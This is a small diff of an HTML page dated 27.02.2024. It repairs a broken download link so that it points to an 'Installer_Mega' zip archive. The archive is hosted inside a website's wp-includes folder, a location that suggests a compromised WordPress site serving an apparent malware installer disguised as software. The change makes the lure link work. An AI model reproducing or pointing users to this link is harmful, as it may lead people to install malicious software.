@@ -8,6 +8,6 @@
 <p>Date: 27.02.2024</p>
 </ol>
 <p></p>
-<p><strong>Download Link:</strong> <a href="https://kyaneez.com/wp-includes/Installer_Mega_v0.7.4t.zip<strong">Click</strong></a>
+<p><strong>Download Link:</strong> <a href="https://kyaneez.com/wp-includes/Installer_Mega_v0.7.4t.zip"<strong>Click</strong></a>
 </p>
 
